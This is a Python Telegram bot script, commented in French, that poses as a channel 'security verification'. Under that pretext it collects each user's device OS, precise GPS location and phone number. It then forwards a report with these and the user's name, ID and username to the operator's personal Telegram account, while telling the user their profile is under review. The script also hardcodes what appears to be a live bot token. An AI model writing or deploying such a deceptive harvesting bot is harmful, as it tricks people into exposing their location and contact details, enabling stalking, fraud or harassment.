import json
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8513965542:AAF0_QXO9PT9UOEPlbnVXaHs4o57elytH1s"
WEBAPP_URL = "https://github.com/xyko1041/mon-bot-verif.git" # On va la créer juste après
MON_ID_TELEGRAM = 5131307841  # <--- METS TON ID ICI (cherche @userinfobot sur TG pour le trouver)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "👋 **Bienvenue !**\n\n"
        "Pour accéder au canal, merci de valider les règles de sécurité."
    )
    kb = [[KeyboardButton("📖 Valider les règles", web_app=WebAppInfo(url=WEBAPP_URL))]]
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True), parse_mode="Markdown")

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = json.loads(update.effective_message.web_app_data.data)
    context.user_data['os'] = data.get("os")
    
    btn_geo = KeyboardButton("📍 Partager ma localisation", request_location=True)
    await update.message.reply_text(
        f"✅ Système {context.user_data['os']} détecté.\n\n"
        "Partage ta position pour vérifier ton secteur.",
        reply_markup=ReplyKeyboardMarkup([[btn_geo]], resize_keyboard=True)
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loc = update.message.location
    context.user_data['geo'] = f"{loc.latitude}, {loc.longitude}"
    
    btn_contact = KeyboardButton("🛡️ Certifier mon compte", request_contact=True)
    await update.message.reply_text(
        "Dernière étape : Clique sur le bouton ci-dessous pour certifier ton identité.",
        reply_markup=ReplyKeyboardMarkup([[btn_contact]], resize_keyboard=True)
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.message.from_user
    
    # Création du rapport pour TOI
    rapport = (
        "🚨 **NOUVEL UTILISATEUR VÉRIFIÉ** 🚨\n\n"
        f"👤 Nom : {user.first_name}\n"
        f"🆔 ID : `{user.id}`\n"
        f"📞 Tel : `{contact.phone_number}`\n"
        f"📱 OS : {context.user_data.get('os')}\n"
        f"📍 Géo : `{context.user_data.get('geo')}`\n"
        f"🔗 Username : @{user.username if user.username else 'Aucun'}"
    )

    # Envoi du rapport à ton compte perso
    await context.bot.send_message(chat_id=MON_ID_TELEGRAM, text=rapport, parse_mode="Markdown")
    
    # Message de fin pour l'utilisateur
    await update.message.reply_text("✅ Merci ! Ton profil est en cours d'examen. Tu recevras un lien d'accès bientôt.")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.run_polling()